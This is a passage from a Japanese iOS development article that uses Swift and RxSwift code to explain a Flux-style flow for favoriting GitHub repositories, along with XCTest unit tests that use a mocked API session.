<code>noNilRepository</code>と<code>store.favorites</code>をcombineLatestし、<strong>favoritesに<code>GithubKit.Repository</code>が含まれているか</strong>と<strong><code>GithubKit.Repository</code></strong>に変換したものを<code>containsRepository: Observable&lt;(Bool, Repository)&gt;</code>とします。<br>
<code>favoriteButtonItem.rx.tap</code>のイベントが渡ってきたら、withLatestFromで<code>containsRepository</code>の最新状態を取得します。<br>
そのイベントをsubscribeし、<code>GithubKit.Repository</code>が含まれていたら<code>action.removeFavorite(:_)</code>、含まれていなかったら<code>action.addFavorite(_:)</code>を実行します。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">RepositoryViewController</span></div>
<div class="highlight"><pre><span></span><span class="kr">final</span> <span class="kd">class</span> <span class="nc">RepositoryViewController</span><span class="p">:</span> <span class="n">SFSafariViewController</span> <span class="p">{</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">favoriteButtonItem</span> <span class="p">=</span> <span class="bp">UIBarButtonItem</span><span class="p">(</span><span class="n">title</span><span class="p">:</span> <span class="kc">nil</span><span class="p">,</span> <span class="n">style</span><span class="p">:</span> <span class="p">.</span><span class="n">plain</span><span class="p">,</span> <span class="n">target</span><span class="p">:</span> <span class="kc">nil</span><span class="p">,</span> <span class="n">action</span><span class="p">:</span> <span class="kc">nil</span><span class="p">)</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">disposeBag</span> <span class="p">=</span> <span class="n">DisposeBag</span><span class="p">()</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">action</span><span class="p">:</span> <span class="n">RepositoryAction</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">store</span><span class="p">:</span> <span class="n">RepositoryStore</span>

    <span class="kd">init</span><span class="p">?(</span><span class="n">action</span><span class="p">:</span> <span class="n">RepositoryAction</span> <span class="p">=</span> <span class="p">.</span><span class="kd">init</span><span class="p">(),</span>
         <span class="n">store</span><span class="p">:</span> <span class="n">RepositoryStore</span> <span class="p">=</span> <span class="p">.</span><span class="n">instantiate</span><span class="p">())</span> <span class="p">{</span>
        <span class="k">guard</span> <span class="kd">let</span> <span class="nv">repository</span> <span class="p">=</span> <span class="n">store</span><span class="p">.</span><span class="n">selectedRepositoryValue</span> <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="kc">nil</span> <span class="p">}</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">action</span> <span class="p">=</span> <span class="n">action</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">store</span> <span class="p">=</span> <span class="n">store</span>
        <span class="kc">super</span><span class="p">.</span><span class="kd">init</span><span class="p">(</span><span class="n">url</span><span class="p">:</span> <span class="n">repository</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">entersReaderIfAvailable</span><span class="p">:</span> <span class="kc">true</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="kr">override</span> <span class="kd">func</span> <span class="nf">viewDidLoad</span><span class="p">()</span> <span class="p">{</span>
        <span class="kc">super</span><span class="p">.</span><span class="n">viewDidLoad</span><span class="p">()</span>
        <span class="p">...</span>
        <span class="c1">// observe store</span>
        <span class="kd">let</span> <span class="nv">noNilRepository</span> <span class="p">=</span> <span class="n">store</span><span class="p">.</span><span class="n">selectedRepository</span>
            <span class="p">.</span><span class="bp">filter</span> <span class="p">{</span> <span class="nv">$0</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">}</span>
            <span class="p">.</span><span class="bp">map</span> <span class="p">{</span> <span class="nv">$0</span><span class="p">!</span> <span class="p">}</span>
        <span class="kd">let</span> <span class="nv">containsRepository</span> <span class="p">=</span> <span class="n">Observable</span><span class="p">.</span><span class="n">combineLatest</span><span class="p">(</span><span class="n">noNilRepository</span><span class="p">,</span> <span class="n">store</span><span class="p">.</span><span class="n">favorites</span><span class="p">)</span>
            <span class="p">{</span> <span class="n">repo</span><span class="p">,</span> <span class="n">favs</span> <span class="k">in</span> <span class="p">(</span><span class="n">favs</span><span class="p">.</span><span class="bp">contains</span> <span class="p">{</span> <span class="nv">$0</span><span class="p">.</span><span class="n">url</span> <span class="p">==</span> <span class="n">repo</span><span class="p">.</span><span class="n">url</span> <span class="p">},</span> <span class="n">repo</span><span class="p">)</span> <span class="p">}</span>

        <span class="n">favoriteButtonItem</span><span class="p">.</span><span class="n">rx</span><span class="p">.</span><span class="n">tap</span>
            <span class="p">.</span><span class="n">withLatestFrom</span><span class="p">(</span><span class="n">containsRepository</span><span class="p">)</span>
            <span class="p">.</span><span class="n">subscribe</span><span class="p">(</span><span class="n">onNext</span><span class="p">:</span> <span class="p">{</span> <span class="p">[</span><span class="kr">weak</span> <span class="kc">self</span><span class="p">]</span> <span class="bp">contains</span><span class="p">,</span> <span class="n">repository</span> <span class="k">in</span>
                <span class="k">if</span> <span class="bp">contains</span> <span class="p">{</span>
                    <span class="kc">self</span><span class="p">?.</span><span class="n">action</span><span class="p">.</span><span class="n">removeFavorite</span><span class="p">(</span><span class="n">repository</span><span class="p">)</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="kc">self</span><span class="p">?.</span><span class="n">action</span><span class="p">.</span><span class="n">addFavorite</span><span class="p">(</span><span class="n">repository</span><span class="p">)</span>
                <span class="p">}</span>
            <span class="p">})</span>
            <span class="p">.</span><span class="n">disposed</span><span class="p">(</span><span class="n">by</span><span class="p">:</span> <span class="n">disposeBag</span><span class="p">)</span>
        <span class="p">...</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p><code>RepositoryAction</code>の<code>addFavorite(_:)</code>または<code>removeFavorite(_:)</code>が呼ばれるとDispatcherを介し、<code>GithubKit.Repository</code>を<code>RepositoryStore</code>で受け取ります。<br>
<code>RepositoryStore</code>では、<code>addFavorite</code>の場合はfavoritesに追加をし、<code>reomveFavorite</code>の場合はfavoritesから削除をします。<br>
それらの更新イベントを、外部に公開されている<code>favorites: Observable&lt;[GithubKit.Repository]&gt;</code>に流します。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">RepositoryFluxFlow</span></div>
<div class="highlight"><pre><span></span><span class="kr">final</span> <span class="kd">class</span> <span class="nc">RepositoryAction</span><span class="p">:</span> <span class="n">Actionable</span> <span class="p">{</span>
    <span class="kd">typealias</span> <span class="n">DispatchValueType</span> <span class="p">=</span> <span class="n">Dispatcher</span><span class="p">.</span><span class="n">Repository</span>
    <span class="p">...</span>
    <span class="kd">func</span> <span class="nf">addFavorite</span><span class="p">(</span><span class="kc">_</span> <span class="n">repository</span><span class="p">:</span> <span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">invoke</span><span class="p">(.</span><span class="n">addFavorite</span><span class="p">(</span><span class="n">repository</span><span class="p">))</span>
    <span class="p">}</span>

    <span class="kd">func</span> <span class="nf">removeFavorite</span><span class="p">(</span><span class="kc">_</span> <span class="n">repository</span><span class="p">:</span> <span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">invoke</span><span class="p">(.</span><span class="n">removeFavorite</span><span class="p">(</span><span class="n">repository</span><span class="p">))</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>

<span class="kd">extension</span> <span class="nc">Dispatcher</span> <span class="p">{</span>
    <span class="kd">enum</span> <span class="nc">Repository</span><span class="p">:</span> <span class="n">DispatchValue</span> <span class="p">{</span>
        <span class="p">...</span>
        <span class="k">case</span> <span class="n">addFavorite</span><span class="p">(</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">)</span>
        <span class="k">case</span> <span class="n">removeFavorite</span><span class="p">(</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">)</span>
        <span class="p">...</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kr">final</span> <span class="kd">class</span> <span class="nc">RepositoryStore</span><span class="p">:</span> <span class="n">Storable</span> <span class="p">{</span>
    <span class="kd">typealias</span> <span class="n">DispatchValueType</span> <span class="p">=</span> <span class="n">Dispatcher</span><span class="p">.</span><span class="n">Repository</span>
    <span class="p">...</span>
    <span class="kd">let</span> <span class="nv">favorites</span><span class="p">:</span> <span class="n">Observable</span><span class="o">&lt;</span><span class="p">[</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">]</span><span class="o">&gt;</span>
    <span class="kd">var</span> <span class="nv">favoritesValue</span><span class="p">:</span> <span class="p">[</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">]</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">_favorites</span><span class="p">.</span><span class="n">value</span>
    <span class="p">}</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">_favorites</span> <span class="p">=</span> <span class="n">Variable</span><span class="o">&lt;</span><span class="p">[</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">]</span><span class="o">&gt;</span><span class="p">([])</span>
    <span class="p">...</span>
    <span class="kd">init</span><span class="p">(</span><span class="n">dispatcher</span><span class="p">:</span> <span class="n">Dispatcher</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">...</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">favorites</span> <span class="p">=</span> <span class="n">_favorites</span><span class="p">.</span><span class="n">asObservable</span><span class="p">()</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">selectedRepository</span> <span class="p">=</span> <span class="n">_selectedRepository</span><span class="p">.</span><span class="n">asObservable</span><span class="p">()</span>
        <span class="p">...</span>
        <span class="n">register</span> <span class="p">{</span> <span class="p">[</span><span class="kr">weak</span> <span class="kc">self</span><span class="p">]</span> <span class="k">in</span>
            <span class="k">switch</span> <span class="nv">$0</span> <span class="p">{</span>
            <span class="p">...</span>
            <span class="k">case</span> <span class="p">.</span><span class="n">addFavorite</span><span class="p">(</span><span class="kd">let</span> <span class="nv">value</span><span class="p">):</span>
                <span class="k">if</span> <span class="kc">self</span><span class="p">?.</span><span class="n">_favorites</span><span class="p">.</span><span class="n">value</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="k">where</span><span class="p">:</span> <span class="p">{</span> <span class="nv">$0</span><span class="p">.</span><span class="n">url</span> <span class="p">==</span> <span class="n">value</span><span class="p">.</span><span class="n">url</span> <span class="p">})</span> <span class="p">==</span> <span class="kc">nil</span> <span class="p">{</span>
                    <span class="kc">self</span><span class="p">?.</span><span class="n">_favorites</span><span class="p">.</span><span class="n">value</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
                <span class="p">}</span>
            <span class="k">case</span> <span class="p">.</span><span class="n">removeFavorite</span><span class="p">(</span><span class="kd">let</span> <span class="nv">value</span><span class="p">):</span>
                <span class="k">if</span> <span class="kd">let</span> <span class="nv">index</span> <span class="p">=</span> <span class="kc">self</span><span class="p">?.</span><span class="n">_favorites</span><span class="p">.</span><span class="n">value</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="k">where</span><span class="p">:</span> <span class="p">{</span> <span class="nv">$0</span><span class="p">.</span><span class="n">url</span> <span class="p">==</span> <span class="n">value</span><span class="p">.</span><span class="n">url</span> <span class="p">})</span> <span class="p">{</span>
                    <span class="kc">self</span><span class="p">?.</span><span class="n">_favorites</span><span class="p">.</span><span class="n">value</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">at</span><span class="p">:</span> <span class="n">index</span><span class="p">)</span>
                <span class="p">}</span>
            <span class="p">...</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p><code>FavoriteViewController</code>では<code>RepositoryStore</code>の<code>favorites</code>のイベントを受け取ると、Voidに変換し<code>reloadData: AnyObserver&lt;Void&gt;</code>にbindします。<br>
すると<code>tableView.reloadData()</code>を実行され、<code>FavoriteViewController</code>上でリストが更新されます。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">FavoriteViewController</span></div>
<div class="highlight"><pre><span></span><span class="kr">final</span> <span class="kd">class</span> <span class="nc">FavoriteViewController</span><span class="p">:</span> <span class="bp">UIViewController</span> <span class="p">{</span>
    <span class="kr">@IBOutlet</span> <span class="kr">weak</span> <span class="kd">var</span> <span class="nv">tableView</span><span class="p">:</span> <span class="bp">UITableView</span><span class="p">!</span> 

    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">dataSource</span> <span class="p">=</span> <span class="n">FavoriteViewDataSource</span><span class="p">()</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">disposeBag</span> <span class="p">=</span> <span class="n">DisposeBag</span><span class="p">()</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">store</span><span class="p">:</span> <span class="n">RepositoryStore</span> <span class="p">=</span> <span class="p">.</span><span class="n">instantiate</span><span class="p">()</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">action</span> <span class="p">=</span> <span class="n">RepositoryAction</span><span class="p">()</span>

    <span class="kr">override</span> <span class="kd">func</span> <span class="nf">viewDidLoad</span><span class="p">()</span> <span class="p">{</span>
        <span class="kc">super</span><span class="p">.</span><span class="n">viewDidLoad</span><span class="p">()</span>
        <span class="p">...</span>
        <span class="n">store</span><span class="p">.</span><span class="n">favorites</span><span class="p">.</span><span class="bp">map</span> <span class="p">{</span> <span class="kc">_</span> <span class="k">in</span> <span class="p">}</span>
            <span class="p">.</span><span class="n">bind</span><span class="p">(</span><span class="n">to</span><span class="p">:</span> <span class="n">reloadData</span><span class="p">)</span>
            <span class="p">.</span><span class="n">disposed</span><span class="p">(</span><span class="n">by</span><span class="p">:</span> <span class="n">disposeBag</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="p">...</span>
    <span class="kd">private</span> <span class="kd">var</span> <span class="nv">reloadData</span><span class="p">:</span> <span class="n">AnyObserver</span><span class="p">&lt;</span><span class="nb">Void</span><span class="p">&gt;</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">UIBindingObserver</span><span class="p">(</span><span class="n">UIElement</span><span class="p">:</span> <span class="kc">self</span><span class="p">)</span> <span class="p">{</span> <span class="n">me</span><span class="p">,</span> <span class="kc">_</span> <span class="k">in</span>
            <span class="n">me</span><span class="p">.</span><span class="n">tableView</span><span class="p">.</span><span class="n">reloadData</span><span class="p">()</span>
        <span class="p">}.</span><span class="n">asObserver</span><span class="p">()</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p>お気に入りに追加/削除される流れは下図のようになります。</p>

<p><code>RepositoryStore</code>はどこからでも参照が可能なので、<code>FavoriteViewController</code>からの遷移時に<code>RepositoryViewController</code>のinitializerの引数として渡す必要がありません。<br>
<code>RepositoryViewController</code>では、<code>RepositoryStore</code>の<code>favorites</code>に<code>RepositoryStore</code>の<code>selectedRepository</code>が含まれているかを確認し、<code>RepositoryAction</code>から追加または削除を実行します。<br>
その結果が<code>RepositoryStore</code>に反映され、公開している<code>favorites: Observable&lt;[GithubKit.Repositor]&gt;</code>にイベントが流れます。<br>
favoritesの更新イベントを<code>FavoriteViewController</code>内で<code>Observable&lt;Void&gt;</code>に変換し<code>reloadData: AnyObserver&lt;Void&gt;</code>にbindされ、<code>tableView.reloadData()</code>が実行されるので<code>FavoriteViewController</code>上でリストが更新されます。</p>

<p><a href="https://camo.qiitausercontent.com/9d106455cc47d4dd544e76ed9f3306c2c5905291/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f38633033323163362d303431342d643066342d643961632d3166313862663964666431622e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/9d106455cc47d4dd544e76ed9f3306c2c5905291/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f38633033323163362d303431342d643066342d643961632d3166313862663964666431622e6a706567" alt="Flux.003.jpeg" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/60325/8c0321c6-0414-d0f4-d9ac-1f18bf9dfd1b.jpeg"></a></p>

<h3>
<span id="テスト-2" class="fragment"></span><a href="#%E3%83%86%E3%82%B9%E3%83%88-2"><i class="fa fa-link"></i></a>テスト</h3>

<p>下記のようにXCTestなどで、<code>RepositoryAction</code>で渡した値が<code>RepositorStore</code>に反映されるのかのテストを実行することができます。<br>
テストメソッド内では該当するStore内のObservableをsubscribeし、closureに対して期待する結果を記述します。<br>
その後に紐づくActionのメソットを実行しています。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">RepositoryFluxFlowTestCase</span><span class="p">:</span> <span class="n">XCTestCase</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nv">action</span><span class="p">:</span> <span class="n">RepositoryAction</span><span class="p">!</span>
    <span class="kd">var</span> <span class="nv">store</span><span class="p">:</span> <span class="n">RepositoryStore</span><span class="p">!</span>

    <span class="kr">override</span> <span class="kd">func</span> <span class="nf">setUp</span><span class="p">()</span> <span class="p">{</span>
        <span class="kc">super</span><span class="p">.</span><span class="n">setUp</span><span class="p">()</span>

        <span class="kc">self</span><span class="p">.</span><span class="n">action</span> <span class="p">=</span> <span class="n">RepositoryAction</span><span class="p">()</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">store</span> <span class="p">=</span> <span class="n">RepositoryStore</span><span class="p">.</span><span class="n">instantiate</span><span class="p">()</span>
    <span class="p">}</span>

    <span class="kd">func</span> <span class="nf">testSelectedRepository</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nv">expectation</span> <span class="p">=</span> <span class="kc">self</span><span class="p">.</span><span class="n">expectation</span><span class="p">(</span><span class="n">description</span><span class="p">:</span> <span class="s">"testSelectedRepository expectation"</span><span class="p">)</span>

        <span class="kd">let</span> <span class="nv">repository</span> <span class="p">=</span> <span class="n">Repository</span><span class="p">.</span><span class="n">mock</span><span class="p">()</span>
        <span class="kd">let</span> <span class="nv">disposable</span> <span class="p">=</span> <span class="n">store</span><span class="p">.</span><span class="n">selectedRepository</span>
            <span class="p">.</span><span class="n">skip</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
            <span class="p">.</span><span class="n">subscribe</span><span class="p">(</span><span class="n">onNext</span><span class="p">:</span> <span class="p">{</span>
                <span class="k">guard</span> <span class="kd">let</span> <span class="nv">selectedRepository</span> <span class="p">=</span> <span class="nv">$0</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="n">XCTFail</span><span class="p">()</span>
                    <span class="k">return</span>
                <span class="p">}</span>
                <span class="n">XCTAssertEqual</span><span class="p">(</span><span class="n">repository</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">selectedRepository</span><span class="p">.</span><span class="n">url</span><span class="p">)</span>
                <span class="n">expectation</span><span class="p">.</span><span class="n">fulfill</span><span class="p">()</span>
            <span class="p">})</span>

        <span class="n">action</span><span class="p">.</span><span class="n">invoke</span><span class="p">(.</span><span class="n">selectedRepository</span><span class="p">(</span><span class="n">repository</span><span class="p">))</span>

        <span class="n">waitForExpectations</span><span class="p">(</span><span class="n">timeout</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">handler</span><span class="p">:</span> <span class="kc">nil</span><span class="p">)</span>
        <span class="n">disposable</span><span class="p">.</span><span class="n">dispose</span><span class="p">()</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div></div>

<p>またActionではメソッドの引数として受け取った値をdispatchするだけではなく、通信を行ってその結果をdispatchする場合もあります。<br>
その場合、Actionのinitializerで通信用のモジュールをprotocolとして抽象化したものを引数として受け取ることで、通信結果の値がStoreに反映されるかのテストをすることができるようになります。<br>
下記の例の場合は、<code>ApiSessionType</code>として通信用のモジュールを抽象化し、<code>func send&lt;T: Request&gt;(_ request: T) -&gt; Observable&lt;Response&lt;T.ResponseType&gt;&gt;</code>を宣言しています。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">protocol</span> <span class="nc">ApiSessionType</span><span class="p">:</span> <span class="kd">class</span> <span class="p">{</span>
    <span class="kd">func</span> <span class="nf">send</span><span class="p">&lt;</span><span class="n">T</span><span class="p">:</span> <span class="n">Request</span><span class="p">&gt;(</span><span class="kc">_</span> <span class="n">request</span><span class="p">:</span> <span class="n">T</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="n">Observable</span><span class="p">&lt;</span><span class="n">Response</span><span class="p">&lt;</span><span class="n">T</span><span class="p">.</span><span class="n">ResponseType</span><span class="p">&gt;</span><span class="o">&gt;</span> 
<span class="p">}</span>

<span class="kr">final</span> <span class="kd">class</span> <span class="nc">RepositoryAction</span><span class="p">:</span> <span class="n">Actionable</span> <span class="p">{</span>
    <span class="kd">typealias</span> <span class="n">DispatchValueType</span> <span class="p">=</span> <span class="n">Dispatcher</span><span class="p">.</span><span class="n">Repository</span>

    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">session</span><span class="p">:</span> <span class="n">ApiSessionType</span>
    <span class="kd">private</span> <span class="kd">var</span> <span class="nv">disposeBag</span> <span class="p">=</span> <span class="n">DisposeBag</span><span class="p">()</span>

    <span class="kd">init</span><span class="p">(</span><span class="n">session</span><span class="p">:</span> <span class="n">ApiSessionType</span> <span class="p">=</span> <span class="n">ApiSession</span><span class="p">.</span><span class="n">shared</span><span class="p">)</span> <span class="p">{</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">session</span> <span class="p">=</span> <span class="n">session</span>
    <span class="p">}</span>
    <span class="p">...</span>
    <span class="kd">func</span> <span class="nf">fetchRepositories</span><span class="p">(</span><span class="n">withUserId</span> <span class="n">id</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span> <span class="n">after</span><span class="p">:</span> <span class="nb">String</span><span class="p">?)</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nv">request</span> <span class="p">=</span> <span class="n">UserNodeRequest</span><span class="p">(</span><span class="n">id</span><span class="p">:</span> <span class="n">id</span><span class="p">,</span> <span class="n">after</span><span class="p">:</span> <span class="n">after</span><span class="p">)</span>
        <span class="n">session</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
            <span class="p">.</span><span class="n">subscribe</span><span class="p">(</span><span class="n">onNext</span><span class="p">:</span> <span class="p">{</span> <span class="p">[</span><span class="kr">weak</span> <span class="kc">self</span><span class="p">]</span> <span class="k">in</span>
                <span class="kc">self</span><span class="p">?.</span><span class="n">invoke</span><span class="p">(.</span><span class="n">lastPageInfo</span><span class="p">(</span><span class="nv">$0</span><span class="p">.</span><span class="n">pageInfo</span><span class="p">))</span>
                <span class="kc">self</span><span class="p">?.</span><span class="n">invoke</span><span class="p">(.</span><span class="n">addRepositories</span><span class="p">(</span><span class="nv">$0</span><span class="p">.</span><span class="n">nodes</span><span class="p">))</span>
                <span class="kc">self</span><span class="p">?.</span><span class="n">invoke</span><span class="p">(.</span><span class="n">repositoryTotalCount</span><span class="p">(</span><span class="nv">$0</span><span class="p">.</span><span class="n">totalCount</span><span class="p">))</span>
            <span class="p">})</span>
            <span class="p">.</span><span class="n">disposed</span><span class="p">(</span><span class="n">by</span><span class="p">:</span> <span class="n">disposeBag</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div></div>

<p><code>ApiSessionType</code>を採用している<code>ApiSessionMock</code>では、<code>result: ApiSession.Result&lt;Any&gt;?</code>として通信の擬似的な結果を外部から設定できるようになっています。<br>
<code>ApiSessionMock</code>で<code>func send&lt;T: Request&gt;(_ request: T) -&gt; Observable&lt;Response&lt;T.ResponseType&gt;&gt;</code>を実装する際に、resultのAssociated ValueをObservableにラップして返しています。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">ApiSessionMock</span><span class="p">:</span> <span class="n">ApiSessionType</span> <span class="p">{</span>
    <span class="kd">enum</span> <span class="nc">Error</span><span class="p">:</span> <span class="n">Swift</span><span class="p">.</span><span class="n">Error</span> <span class="p">{</span>
        <span class="k">case</span> <span class="n">requestFailed</span>
    <span class="p">}</span>

    <span class="kd">var</span> <span class="nv">result</span><span class="p">:</span> <span class="n">ApiSession</span><span class="p">.</span><span class="n">Result</span><span class="p">&lt;</span><span class="nb">Any</span><span class="p">&gt;?</span>

    <span class="kd">func</span> <span class="nf">send</span><span class="p">&lt;</span><span class="n">T</span><span class="p">:</span> <span class="n">Request</span><span class="p">&gt;(</span><span class="kc">_</span> <span class="n">request</span><span class="p">:</span> <span class="n">T</span><span class="p">)</span> <span class="p">-&gt;</span> <span class="n">Observable</span><span class="p">&lt;</span><span class="n">Response</span><span class="p">&lt;</span><span class="n">T</span><span class="p">.</span><span class="n">ResponseType</span><span class="p">&gt;</span><span class="o">&gt;</span> <span class="p">{</span>
        <span class="k">switch</span> <span class="n">result</span> <span class="p">{</span>
        <span class="k">case</span> <span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="kd">let</span> <span class="nv">value</span> <span class="k">as</span> <span class="n">Response</span><span class="p">&lt;</span><span class="n">T</span><span class="p">.</span><span class="n">ResponseType</span><span class="p">&gt;)?:</span>
            <span class="k">return</span> <span class="p">.</span><span class="n">just</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
        <span class="k">default</span><span class="p">:</span>
            <span class="k">return</span> <span class="p">.</span><span class="n">error</span><span class="p">(</span><span class="n">Error</span><span class="p">.</span><span class="n">requestFailed</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<p><code>RepositoryFluxFlowTestCase</code>で<code>RepositoryAction</code>を初期化する際に、引数として<code>ApiSessionMock</code>のインスタンスを渡します。<br>
<code>testFetchRepositories()</code>では、まず通信の擬似的な結果をsession.resultに設定します。<br>
そして、storeで保持している値から更新イベントを受け取った際に期待する結果をsubscribe内に記述します。<br>
最後に、<code>action.fetchRepositories(withUserId:, after:)</code>を呼んでテストを行います。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">RepositoryFluxFlowTestCase</span><span class="p">:</span> <span class="n">XCTestCase</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nv">session</span><span class="p">:</span> <span class="n">ApiSessionMock</span><span class="p">!</span>
    <span class="kd">var</span> <span class="nv">action</span><span class="p">:</span> <span class="n">RepositoryAction</span><span class="p">!</span>
    <span class="kd">var</span> <span class="nv">store</span><span class="p">:</span> <span class="n">RepositoryStore</span><span class="p">!</span>

    <span class="kr">override</span> <span class="kd">func</span> <span class="nf">setUp</span><span class="p">()</span> <span class="p">{</span>
        <span class="kc">super</span><span class="p">.</span><span class="n">setUp</span><span class="p">()</span>

        <span class="kc">self</span><span class="p">.</span><span class="n">session</span> <span class="p">=</span> <span class="n">ApiSessionMock</span><span class="p">()</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">action</span> <span class="p">=</span> <span class="n">RepositoryAction</span><span class="p">(</span><span class="n">session</span><span class="p">:</span> <span class="kc">self</span><span class="p">.</span><span class="n">session</span><span class="p">)</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">store</span> <span class="p">=</span> <span class="n">RepositoryStore</span><span class="p">.</span><span class="n">instantiate</span><span class="p">()</span>
    <span class="p">}</span>

    <span class="kd">func</span> <span class="nf">testFetchRepositories</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nv">expectation</span> <span class="p">=</span> <span class="kc">self</span><span class="p">.</span><span class="n">expectation</span><span class="p">(</span><span class="n">description</span><span class="p">:</span> <span class="s">"testFetchRepositories expectation"</span><span class="p">)</span>

        <span class="kd">let</span> <span class="nv">repository</span> <span class="p">=</span> <span class="n">Repository</span><span class="p">.</span><span class="n">mock</span><span class="p">()</span>
        <span class="kd">let</span> <span class="nv">pageInfo</span> <span class="p">=</span> <span class="n">PageInfo</span><span class="p">.</span><span class="n">mock</span><span class="p">()</span>
        <span class="kd">let</span> <span class="nv">totalCount</span> <span class="p">=</span> <span class="mi">10</span>
        <span class="kd">let</span> <span class="nv">response</span> <span class="p">=</span> <span class="n">Response</span><span class="p">&lt;</span><span class="n">Repository</span><span class="p">&gt;(</span><span class="n">nodes</span><span class="p">:</span> <span class="p">[</span><span class="n">repository</span><span class="p">],</span> <span class="n">pageInfo</span><span class="p">:</span> <span class="n">pageInfo</span><span class="p">,</span> <span class="n">totalCount</span><span class="p">:</span> <span class="n">totalCount</span><span class="p">)</span>
        <span class="n">session</span><span class="p">.</span><span class="n">result</span> <span class="p">=</span> <span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
        <span class="kd">let</span> <span class="nv">disposable</span> <span class="p">=</span>
            <span class="n">Observable</span><span class="p">.</span><span class="n">zip</span><span class="p">(</span><span class="n">store</span><span class="p">.</span><span class="n">repositories</span><span class="p">.</span><span class="n">skip</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
                           <span class="n">store</span><span class="p">.</span><span class="n">lastPageInfo</span><span class="p">.</span><span class="n">skip</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
                           <span class="n">store</span><span class="p">.</span><span class="n">repositoryTotalCount</span><span class="p">.</span><span class="n">skip</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
                <span class="p">.</span><span class="n">subscribe</span><span class="p">(</span><span class="n">onNext</span><span class="p">:</span> <span class="p">{</span> <span class="n">repositories</span><span class="p">,</span> <span class="n">lastPageInfo</span><span class="p">,</span> <span class="n">repositoryTotalCount</span> <span class="k">in</span>
